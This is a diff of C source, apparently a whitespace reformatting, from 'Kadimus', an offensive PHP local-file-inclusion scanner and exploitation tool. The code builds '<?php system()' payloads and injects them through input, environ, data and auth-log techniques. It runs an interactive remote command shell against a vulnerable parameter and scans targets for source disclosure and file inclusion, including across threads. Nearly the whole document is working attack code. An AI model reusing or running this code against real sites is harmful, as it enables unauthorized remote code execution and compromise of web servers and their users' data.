-		aux_len = 29+strlen(xpl.cmd);
-		aux = xmalloc( aux_len );
-		snprintf(aux, aux_len,"<?php system(\"%s 2>&1\"); ?>", xpl.cmd);
-		rce_code_exec = make_code(r_str, aux, (xpl.tech == AUTH) ? true : false);
-		xfree(aux);
-	} else {
-		rce_code_exec = make_code(r_str, xpl.code, (xpl.tech == AUTH) ? true : false);
-	}
+    if(xpl.cmdx){
+        aux_len = 29+strlen(xpl.cmd);
+        aux = xmalloc( aux_len );
+        snprintf(aux, aux_len,"<?php system(\"%s 2>&1\"); ?>", xpl.cmd);
+        rce_code_exec = make_code(r_str, aux, (xpl.tech == AUTH) ? true : false);
+        xfree(aux);
+    } else {
+        rce_code_exec = make_code(r_str, xpl.code, (xpl.tech == AUTH) ? true : false);
+    }
 
-	printf("\n[~] Trying exec code ...\n");
+    printf("\n[~] Trying exec code ...\n");
 
-	if(xpl.tech == ENVIRON){
-		chomp_all(rce_code_exec);
-		build_rce_exploit(curl, rce_code_exec, ENVIRON, NULL, NULL, 0, 0);
-	}
+    if(xpl.tech == ENVIRON){
+        chomp_all(rce_code_exec);
+        build_rce_exploit(curl, rce_code_exec, ENVIRON, NULL, NULL, 0, 0);
+    }
 
-	else if(xpl.tech == INPUT){
-		build_rce_exploit(curl, rce_code_exec, INPUT, NULL, NULL, 0, 0);
-	}
+    else if(xpl.tech == INPUT){
+        build_rce_exploit(curl, rce_code_exec, INPUT, NULL, NULL, 0, 0);
+    }
 
-	else if(xpl.tech == DATA){
-		build_rce_exploit(curl, rce_code_exec, DATA, GetParameters, base_uri, parameters_len, (size_t)inject_index);
-	}
+    else if(xpl.tech == DATA){
+        build_rce_exploit(curl, rce_code_exec, DATA, GetParameters, base_uri, parameters_len, (size_t)inject_index);
+    }
 
-	else if(xpl.tech == AUTH){
-		build_rce_exploit(curl, rce_code_exec, AUTH, NULL, NULL, 0, 0);
-	}
+    else if(xpl.tech == AUTH){
+        build_rce_exploit(curl, rce_code_exec, AUTH, NULL, NULL, 0, 0);
+    }
 
-	if(HttpRequest(curl)){
-		if(xpl.tech == AUTH){
-			fflush(x);
-			fclose(x);
-			fd = readonly(random_file);
-			size_file = get_file_size(fd);
+    if(HttpRequest(curl)){
+        if(xpl.tech == AUTH){
+            fflush(x);
+            fclose(x);
+            fd = readonly(random_file);
+            size_file = get_file_size(fd);
 
-			if(size_file){
-				mmap_str = mmap(0, size_file, PROT_READ, MAP_PRIVATE, fd, 0);
-				regex_out = regex_extract(regex, mmap_str, size_file, PCRE_DOTALL, &len);
-			}
-			
-			close(fd);
-		}
+            if(size_file){
+                mmap_str = mmap(0, size_file, PROT_READ, MAP_PRIVATE, fd, 0);
+                regex_out = regex_extract(regex, mmap_str, size_file, PCRE_DOTALL, &len);
+            }
 
-		else {
-			regex_out = regex_extract(regex, body.ptr, body.len, PCRE_DOTALL, &len);
-		}
-		
-		printf("\n[+] Result: ");
+            close(fd);
+        }
 
-		if(len > 0){
-			printf("\n\n'%s'\n",regex_out[0]);
-			regex_free(regex_out);
-		} else {
-			printf("nothing to show !\n");
-		}
-	}
+        else {
+            regex_out = regex_extract(regex, body.ptr, body.len, PCRE_DOTALL, &len);
+        }
 
-	printf("\n\n[+] Finish\n\n");
+        printf("\n[+] Result: ");
 
-	if(xpl.tech == DATA){
-		xfree(base_uri);
-		free_get_parameters(GetParameters, parameters_len);
-	}
+        if(len > 0){
+            printf("\n\n'%s'\n",regex_out[0]);
+            regex_free(regex_out);
+        } else {
+            printf("nothing to show !\n");
+        }
+    }
 
-	xfree(rce_code_exec);
-	if(xpl.tech != AUTH){
-		xfree(body.ptr);
-	} else {
-		unlink(random_file);
-	}
+    printf("\n\n[+] Finish\n\n");
 
-	curl_easy_cleanup(curl);
-	curl_slist_free_all(chunk);
+    if(xpl.tech == DATA){
+        xfree(base_uri);
+        free_get_parameters(GetParameters, parameters_len);
+    }
+
+    xfree(rce_code_exec);
+    if(xpl.tech != AUTH){
+        xfree(body.ptr);
+    } else {
+        unlink(random_file);
+    }
+
+    curl_easy_cleanup(curl);
+    curl_slist_free_all(chunk);
 }
 
 void rce_http_shell(const char *rce_uri, rce_type tech, const char *p_name){
-	char cmd[1000], ran_str[R_SIZE],
-	**regex_data = NULL, regex[M_ALL_SIZE], *base_uri = NULL;
-	char *aux=NULL;
-	char *php_code, random_file[20], *mmap_str;
-	// php_code[1000+R_SIZE+R_SIZE+23],
-	GET_DATA *GetParameters = NULL;
-	size_t parameters_len = 0;
-	size_t inject_index = 0;
-	struct request body;
-	ssize_t nbytes = 0;
-	FILE *x=NULL;
-	int len = 0, aux_len=0,fd,size_file;
+    char cmd[1000], ran_str[R_SIZE],
+    **regex_data = NULL, regex[M_ALL_SIZE], *base_uri = NULL;
+    char *aux=NULL;
+    char *php_code, random_file[20], *mmap_str;
+    // php_code[1000+R_SIZE+R_SIZE+23],
+    GET_DATA *GetParameters = NULL;
+    size_t parameters_len = 0;
+    size_t inject_index = 0;
+    struct request body;
+    ssize_t nbytes = 0;
+    FILE *x=NULL;
+    int len = 0, aux_len=0,fd,size_file;
 
-	CURL *curl=NULL;
-	
-	if(tech != AUTH){
-		curl = init_curl(&body, true);
-	} else {
-		curl = init_curl(NULL, false);
-	}
+    CURL *curl=NULL;
 
-	if(tech != DATA){
-		curl_easy_setopt(curl, CURLOPT_URL, rce_uri);
-	} else {
-		if(!get_element_pos(&GetParameters, &parameters_len, &base_uri, rce_uri, p_name, &inject_index)){
-			printf("[-] Parameter: %s not found !!!\n",p_name);
-			curl_easy_cleanup(curl);
-			return;
-		}
+    if(tech != AUTH){
+        curl = init_curl(&body, true);
+    } else {
+        curl = init_curl(NULL, false);
+    }
 
-	}
+    if(tech != DATA){
+        curl_easy_setopt(curl, CURLOPT_URL, rce_uri);
+    } else {
+        if(!get_element_pos(&GetParameters, &parameters_len, &base_uri, rce_uri, p_name, &inject_index)){
+            printf("[-] Parameter: %s not found !!!\n",p_name);
+            curl_easy_cleanup(curl);
+            return;
+        }
 
-	gen_random(ran_str, R_SIZE-1);
-	build_regex(regex, ran_str, "(.*)");
+    }
 
-	while(1){
-		printf("(kadimus~shell)> ");
-		fflush(stdout);
+    gen_random(ran_str, R_SIZE-1);
+    build_regex(regex, ran_str, "(.*)");
 
-		nbytes = read(0, cmd, sizeof(cmd)-1);
-		if(!nbytes) break;
+    while(1){
+        printf("(kadimus~shell)> ");
+        fflush(stdout);
 
-		if(cmd[nbytes-1] == '\n')
-			cmd[nbytes-1] = 0x0;
-		else
-			cmd[nbytes] = 0x0;
+        nbytes = read(0, cmd, sizeof(cmd)-1);
+        if(!nbytes) break;
 
-		if(!cmd[0])
-			continue;
+        if(cmd[nbytes-1] == '\n')
+            cmd[nbytes-1] = 0x0;
+        else
+            cmd[nbytes] = 0x0;
 
-		if(!strcmp(cmd, "exit"))
-			break;
+        if(!cmd[0])
+            continue;
 
-		aux_len = 29+nbytes;
-		aux = xmalloc( aux_len );
-		snprintf(aux, aux_len, "<?php system(\"%s\"); ?>", cmd );
-		php_code = make_code(ran_str, aux, (tech == AUTH) ? true : false);
-		xfree(aux);
+        if(!strcmp(cmd, "exit"))
+            break;
 
-		if(tech != AUTH){
-			init_str(&body);
-		} else {
-			if( (x = get_random_file(10, random_file))== NULL )
-				die("error while generate random file",0);
+        aux_len = 29+nbytes;
+        aux = xmalloc( aux_len );
+        snprintf(aux, aux_len, "<?php system(\"%s\"); ?>", cmd );
+        php_code = make_code(ran_str, aux, (tech == AUTH) ? true : false);
+        xfree(aux);
 
-			curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)x);
-		}
+        if(tech != AUTH){
+            init_str(&body);
+        } else {
+            if( (x = get_random_file(10, random_file))== NULL )
+                die("error while generate random file",0);
 
-		if(tech == INPUT)
-			build_rce_exploit(curl, php_code, INPUT, NULL, NULL, 0, 0);
+            curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)x);
+        }
 
-		else if(tech == ENVIRON)
-			build_rce_exploit(curl, php_code, ENVIRON, NULL, NULL, 0, 0);
+        if(tech == INPUT)
+            build_rce_exploit(curl, php_code, INPUT, NULL, NULL, 0, 0);
 
-		else if(tech == DATA)
-			build_rce_exploit(curl, php_code, DATA, GetParameters, base_uri, parameters_len, (size_t)inject_index);
-		else if(tech == AUTH)
-			build_rce_exploit(curl, php_code, AUTH, NULL, NULL, 0, 0);
+        else if(tech == ENVIRON)
+            build_rce_exploit(curl, php_code, ENVIRON, NULL, NULL, 0, 0);
 
-		if(HttpRequest(curl)){
-			if(tech == AUTH){
-				fflush(x);
-				fclose(x);
-				fd = readonly(random_file);
-				size_file = get_file_size(fd);
-				mmap_str = (char *) mmap(0, size_file, PROT_READ, MAP_PRIVATE, fd, 0);
-				regex_data = regex_extract(regex, mmap_str, size_file, PCRE_DOTALL, &len);
-				close(fd);
-			}
-			
-			else {
-				regex_data = regex_extract(regex, body.ptr, body.len, PCRE_DOTALL, &len);
-			}
-			
-			if(len > 0) {
-				printf("%s",regex_data[0]);
-				regex_free(regex_data);
-			}
+        else if(tech == DATA)
+            build_rce_exploit(curl, php_code, DATA, GetParameters, base_uri, parameters_len, (size_t)inject_index);
+        else if(tech == AUTH)
+            build_rce_exploit(curl, php_code, AUTH, NULL, NULL, 0, 0);
 
-		}
+        if(HttpRequest(curl)){
+            if(tech == AUTH){
+                fflush(x);
+                fclose(x);
+                fd = readonly(random_file);
+                size_file = get_file_size(fd);
+                mmap_str = (char *) mmap(0, size_file, PROT_READ, MAP_PRIVATE, fd, 0);
+                regex_data = regex_extract(regex, mmap_str, size_file, PCRE_DOTALL, &len);
+                close(fd);
+            }
 
-		if(tech != AUTH){
-			xfree(body.ptr);
-		} else {
-			unlink(random_file);
-		}
-		
-		xfree(php_code);
-	}
+            else {
+                regex_data = regex_extract(regex, body.ptr, body.len, PCRE_DOTALL, &len);
+            }
 
-	if(tech == DATA){
-		xfree(base_uri);
-		free_get_parameters(GetParameters, parameters_len);
-	}
+            if(len > 0) {
+                printf("%s",regex_data[0]);
+                regex_free(regex_data);
+            }
 
-	curl_easy_cleanup(curl);
+        }
+
+        if(tech != AUTH){
+            xfree(body.ptr);
+        } else {
+            unlink(random_file);
+        }
+
+        xfree(php_code);
+    }
+
+    if(tech == DATA){
+        xfree(base_uri);
+        free_get_parameters(GetParameters, parameters_len);
+    }
+
+    curl_easy_cleanup(curl);
 }
 
 int common_error_check(const char *uri){
-	int result = 0;
-	struct request body;
-	char *error = NULL;
-	size_t alloc_size = 0;
-	CURL *ch = init_curl(&body, true);
+    int result = 0;
+    struct request body;
+    char *error = NULL;
+    size_t alloc_size = 0;
+    CURL *ch = init_curl(&body, true);
 
-	FILE *fh_error = xfopen(ERROR_FILE, "r");
+    FILE *fh_error = xfopen(ERROR_FILE, "r");
 
-	alloc_size = get_max_len(fh_error);
+    alloc_size = get_max_len(fh_error);
 
-	error = xmalloc( alloc_size+1 );
+    error = xmalloc( alloc_size+1 );
 
-	init_str(&body);
+    init_str(&body);
 
-	curl_easy_setopt(ch, CURLOPT_URL, uri);
+    curl_easy_setopt(ch, CURLOPT_URL, uri);
 
-	if(!HttpRequest(ch)){
-		result = -1;
-	} else {
-		if(check_error(body.ptr))
-			result = 1;
-	}
+    if(!HttpRequest(ch)){
+        result = -1;
+    } else {
+        if(check_error(body.ptr))
+            result = 1;
+    }
 
-	curl_easy_cleanup(ch);
-	xfree(body.ptr);
-	xfree(error);
-	fclose(fh_error);
+    curl_easy_cleanup(ch);
+    xfree(body.ptr);
+    xfree(error);
+    fclose(fh_error);
 
-	return result;
+    return result;
 }
 
 int disclosure_check(const char *uri, const char *xuri){
-	char *b64 = NULL, *b64_dec = NULL;
-	struct request body1, body2;
-	int result = 0;
+    char *b64 = NULL, *b64_dec = NULL;
+    struct request body1, body2;
+    int result = 0;
 
-	CURL *ch1 = init_curl(&body1, true);
-	CURL *ch2 = init_curl(&body2, true);
+    CURL *ch1 = init_curl(&body1, true);
+    CURL *ch2 = init_curl(&body2, true);
 
-	init_str(&body1);
-	init_str(&body2);
+    init_str(&body1);
+    init_str(&body2);
 
-	curl_easy_setopt(ch1, CURLOPT_URL, uri);
-	curl_easy_setopt(ch2, CURLOPT_URL, xuri);
+    curl_easy_setopt(ch1, CURLOPT_URL, uri);
+    curl_easy_setopt(ch2, CURLOPT_URL, xuri);
 
-	if(!HttpRequest(ch1) || !HttpRequest(ch2)){
-		result = -1;
-		goto end;
-	}
+    if(!HttpRequest(ch1) || !HttpRequest(ch2)){
+        result = -1;
+        goto end;
+    }
 
-	b64 = diff(body1.ptr, body2.ptr);
+    b64 = diff(body1.ptr, body2.ptr);
 
-	if(!b64)
-		goto end;
+    if(!b64)
+        goto end;
 
-	trim_string(&b64);
+    trim_string(&b64);
 
-	if(b64_decode(b64, &b64_dec)){
-		result = 1;
+    if(b64_decode(b64, &b64_dec)){
+        result = 1;
 
-		if(!thread_on){
-			print_all("[~] Target probably vulnerable\n\n");
-			hex_print(b64_dec);
-			print_all("\n");
-		}
+        if(!thread_on){
+            print_all("[~] Target probably vulnerable\n\n");
+            hex_print(b64_dec);
+            print_all("\n");
+        }
 
-		xfree(b64_dec);
-	}
+        xfree(b64_dec);
+    }
 
-	xfree(b64);
+    xfree(b64);
 
-	end:
-		curl_easy_cleanup(ch1);
-		curl_easy_cleanup(ch2);
-		xfree(body1.ptr);
-		xfree(body2.ptr);
+    end:
+        curl_easy_cleanup(ch1);
+        curl_easy_cleanup(ch2);
+        xfree(body1.ptr);
+        xfree(body2.ptr);
 
-	return result;
+    return result;
 }
 
 void scan(const char *target_uri){
-	GET_DATA *GetParameters = NULL;
-	char *base_uri = NULL, *parameters = NULL;
-	char *source_disc = NULL, *error_uri = NULL;
-	char random_str[R_SIZE];
+    GET_DATA *GetParameters = NULL;
+    char *base_uri = NULL, *parameters = NULL;
+    char *source_disc = NULL, *error_uri = NULL;
+    char random_str[R_SIZE];
 
-	int result = 0;
-	size_t parameters_len = 0, i = 0;
-	bool dynamic = false, previous_error = false;
+    int result = 0;
+    size_t parameters_len = 0, i = 0;
+    bool dynamic = false, previous_error = false;
 
-	extract_url(target_uri, &base_uri, &parameters);
+    extract_url(target_uri, &base_uri, &parameters);
 
-	if(!base_uri || !parameters)
-		goto end;
+    if(!base_uri || !parameters)
+        goto end;
 
-	GetParameters = ParserGet(parameters, &parameters_len);
-	xfree(parameters);
-
-
-	print_all("[+] %s\n\n",target_uri);
-	print_all("[*] Testing if URI have dynamic content\n");
-	result = is_dynamic(target_uri);
-
-	if(result == -1){
-		print_all("[-] No connection with the target URI, exiting ...\n\n");
-		goto end;
-	}
-
-	else if(result == 0 || result == 2){
-		print_all("[~] URI dont have dynamic content\n\n");
-		dynamic = false;
-	}
-
-	else if(result == 1){
-		print_all("[-] URI have dynamic content\n");
-		print_all("[-] Skipping source disclosure test\n\n");
-		dynamic = true;
-	}
-
-	if(result == 2){
-		print_all("[-] Common error found, common error checking will be skip\n\n");
-		previous_error = true;
-	}
-
-	for(i=0; i < parameters_len; i++){
-
-		if(GetParameters[i].key[0] == 0x0)
-			continue;
-
-		print_all("[CHECKING] parameter: %s\n\n",GetParameters[i].key);
-
-		if(!previous_error && GetParameters[i].equal){
-			print_all("[*] Checking Commom Errors\n");
-			error_uri = make_url(GetParameters, parameters_len, base_uri, gen_random(random_str, R_SIZE-1), i, REPLACE);
-			print_all("[~] %s\n",error_uri);
-			result = common_error_check(error_uri);
-
-			if(result == -1){
-				goto end;
-			}
-
-			else if(result == 1){
-				print_all("[+] Error Found !!!\n\n");
-			}
-
-			else {
-				print_all("[-] No errors Found\n\n");
-			}
-
-			xfree(error_uri);
-		}
-
-		if(!dynamic && GetParameters[i].value[0] != 0x0){
-			print_all("[*] Source Disclosure Test\n");
-
-			source_disc = make_url(GetParameters, parameters_len, base_uri, FILTER_WRAP, i, BEFORE);
-			result = disclosure_check(target_uri, source_disc);
-
-			if(result == -1)
-				goto end;
-			else if(result == 1){
-
-			} else {
-				print_all("[-] Not vulnerable\n\n");
-			}
-
-			xfree(source_disc);
-		}
-
-		print_all("[*] Checking Files\n");
-		check_files(GetParameters, parameters_len, base_uri, i);
-		print_all("[~] Ok\n\n");
-
-		print_all("[*] RCE Scan\n\n");
-		rce_scan(GetParameters, parameters_len, base_uri, i);
-		print_all("[~] Ok\n\n");
+    GetParameters = ParserGet(parameters, &parameters_len);
+    xfree(parameters);
 
 
-	}
+    print_all("[+] %s\n\n",target_uri);
+    print_all("[*] Testing if URI have dynamic content\n");
+    result = is_dynamic(target_uri);
 
-	end:
-		xfree(base_uri);
-		xfree(parameters);
-		xfree(error_uri);
-		xfree(source_disc);
+    if(result == -1){
+        print_all("[-] No connection with the target URI, exiting ...\n\n");
+        goto end;
+    }
 
-		if(parameters_len)
-			free_get_parameters(GetParameters, parameters_len);
+    else if(result == 0 || result == 2){
+        print_all("[~] URI dont have dynamic content\n\n");
+        dynamic = false;
+    }
 
-		print_all("[~] Single scan finish !!!\n\n");
-		return;
+    else if(result == 1){
+        print_all("[-] URI have dynamic content\n");
+        print_all("[-] Skipping source disclosure test\n\n");
+        dynamic = true;
+    }
+
+    if(result == 2){
+        print_all("[-] Common error found, common error checking will be skip\n\n");
+        previous_error = true;
+    }
+
+    for(i=0; i < parameters_len; i++){
+
+        if(GetParameters[i].key[0] == 0x0)
+            continue;
+
+        print_all("[CHECKING] parameter: %s\n\n",GetParameters[i].key);
+
+        if(!previous_error && GetParameters[i].equal){
+            print_all("[*] Checking Commom Errors\n");
+            error_uri = make_url(GetParameters, parameters_len, base_uri, gen_random(random_str, R_SIZE-1), i, REPLACE);
+            print_all("[~] %s\n",error_uri);
+            result = common_error_check(error_uri);
+
+            if(result == -1){
+                goto end;
+            }
+
+            else if(result == 1){
+                print_all("[+] Error Found !!!\n\n");
+            }
+
+            else {
+                print_all("[-] No errors Found\n\n");
+            }
+
+            xfree(error_uri);
+        }
+
+        if(!dynamic && GetParameters[i].value[0] != 0x0){
+            print_all("[*] Source Disclosure Test\n");
+
+            source_disc = make_url(GetParameters, parameters_len, base_uri, FILTER_WRAP, i, BEFORE);
+            result = disclosure_check(target_uri, source_disc);
+
+            if(result == -1)
+                goto end;
+            else if(result == 1){
+
+            } else {
+                print_all("[-] Not vulnerable\n\n");
+            }
+
+            xfree(source_disc);
+        }
+
+        print_all("[*] Checking Files\n");
+        check_files(GetParameters, parameters_len, base_uri, i);
+        print_all("[~] Ok\n\n");
+
+        print_all("[*] RCE Scan\n\n");
+        rce_scan(GetParameters, parameters_len, base_uri, i);
+        print_all("[~] Ok\n\n");
+
+
+    }
+
+    end:
+        xfree(base_uri);
+        xfree(parameters);
+        xfree(error_uri);
+        xfree(source_disc);
+
+        if(parameters_len)
+            free_get_parameters(GetParameters, parameters_len);
+
+        print_all("[~] Single scan finish !!!\n\n");
+        return;
 
 }
 
 void *thread_scan(void *url){
-	GET_DATA *GetParameters = NULL;
-	char *target_uri = ((char *) url);
-	char *base_uri = NULL, *parameters = NULL;
-	char *source_disc = NULL, *error_uri = NULL;
-	char random_str[R_SIZE];
+    GET_DATA *GetParameters = NULL;
+    char *target_uri = ((char *) url);
+    char *base_uri = NULL, *parameters = NULL;
+    char *source_disc = NULL, *error_uri = NULL;
+    char random_str[R_SIZE];
 
-	int result = 0;
-	size_t parameters_len = 0, i = 0;
-	bool dynamic = false, previous_error = false;
+    int result = 0;
+    size_t parameters_len = 0, i = 0;
+    bool dynamic = false, previous_error = false;
 
-	extract_url(target_uri, &base_uri, &parameters);
+    extract_url(target_uri, &base_uri, &parameters);
 
-	if(!base_uri || !parameters)
-		goto end;
+    if(!base_uri || !parameters)
+        goto end;
 
-	GetParameters = ParserGet(parameters, &parameters_len);
-	xfree(parameters);
+    GetParameters = ParserGet(parameters, &parameters_len);
+    xfree(parameters);
 
-	printf("[SCANNING] %s\n",target_uri);
-	result = is_dynamic(target_uri);
+    printf("[SCANNING] %s\n",target_uri);
+    result = is_dynamic(target_uri);
 
-	if(result == -1)
-		goto end;
+    if(result == -1)
+        goto end;
 
-	else if(result == 0)
-		dynamic = false;
+    else if(result == 0)
+        dynamic = false;
 
-	else if(result == 1)
-		dynamic = true;
+    else if(result == 1)
+        dynamic = true;
 
-	else if(result == 2){
-		dynamic = false;
-		previous_error = true;
-		print_thread("[PREV-LFI-ERROR] %s\n",target_uri);
-	}
+    else if(result == 2){
+        dynamic = false;
+        previous_error = true;
+        print_thread("[PREV-LFI-ERROR] %s\n",target_uri);
+    }
 
-	for(i=0; i < parameters_len; i++){
+    for(i=0; i < parameters_len; i++){
 
-		if(GetParameters[i].key[0] == 0x0)
-			continue;
+        if(GetParameters[i].key[0] == 0x0)
+            continue;
 
-		if(!previous_error && GetParameters[i].equal){
-			error_uri = make_url(GetParameters, parameters_len, base_uri, gen_random(random_str, R_SIZE-1), i, REPLACE);
-			result = common_error_check(error_uri);
+        if(!previous_error && GetParameters[i].equal){
+            error_uri = make_url(GetParameters, parameters_len, base_uri, gen_random(random_str, R_SIZE-1), i, REPLACE);
+            result = common_error_check(error_uri);
 
-			//if(result == -1)
-			//	goto end;
-			if(result == 1)
-				print_thread("[COMMON-LFI-ERROR] %s\n",error_uri);
+            //if(result == -1)
+            //    goto end;
+            if(result == 1)
+                print_thread("[COMMON-LFI-ERROR] %s\n",error_uri);
 
-			xfree(error_uri);
-		}
+            xfree(error_uri);
+        }
 
-		if(!dynamic && GetParameters[i].value[0] != 0x0){
-			source_disc = make_url(GetParameters, parameters_len, base_uri, FILTER_WRAP, i, BEFORE);
-			result = disclosure_check(target_uri, source_disc);
+        if(!dynamic && GetParameters[i].value[0] != 0x0){
+            source_disc = make_url(GetParameters, parameters_len, base_uri, FILTER_WRAP, i, BEFORE);
+            result = disclosure_check(target_uri, source_disc);
 
-			//if(result == -1)
-			//	goto end;
-			if(result == 1)
-				print_thread("[RSD] %s | %s\n", target_uri, GetParameters[i].key);
+            //if(result == -1)
+            //    goto end;
+            if(result == 1)
+                print_thread("[RSD] %s | %s\n", target_uri, GetParameters[i].key);
 
-			xfree(source_disc);
+            xfree(source_disc);
 
-		}
+        }
 
-		check_files(GetParameters, parameters_len, base_uri, i);
-		rce_scan(GetParameters, parameters_len, base_uri, i);
+        check_files(GetParameters, parameters_len, base_uri, i);
+        rce_scan(GetParameters, parameters_len, base_uri, i);
 
-	}
+    }
 
-	end:
-		xfree(target_uri);
-		xfree(base_uri);
-		xfree(parameters);
-		//xfree(error_uri);
-		//xfree(source_disc);
+    end:
+        xfree(target_uri);
+        xfree(base_uri);
+        xfree(parameters);
+        //xfree(error_uri);
+        //xfree(source_disc);
 
-		if(parameters_len)
-			free_get_parameters(GetParameters, parameters_len);
+        if(parameters_len)
+            free_get_parameters(GetParameters, parameters_len);
 
-	return (void *)0;
+    return (void *)0;
 }
